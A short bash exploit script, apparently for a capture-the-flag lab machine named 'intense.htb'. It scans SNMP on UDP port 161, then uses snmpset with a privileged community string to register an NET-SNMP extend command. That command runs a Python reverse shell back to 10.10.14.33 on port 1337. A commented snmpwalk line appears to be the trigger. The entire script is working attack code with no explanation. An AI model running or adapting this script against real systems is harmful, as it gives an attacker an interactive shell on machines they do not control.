#!/bin/bash
sudo nmap -sU -p161 intense.htb

snmpset -m +NET-SNMP-EXTEND-MIB -v 1 -c SuP3RPrivCom90 intense.htb 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' =   /usr/bin/python3 'nsExtendArgs."command"' = "-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.33\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

sleep 2 

#snmpwalk -v 1 -c SuP3RPrivCom90 intense.htb nsExtendObjects

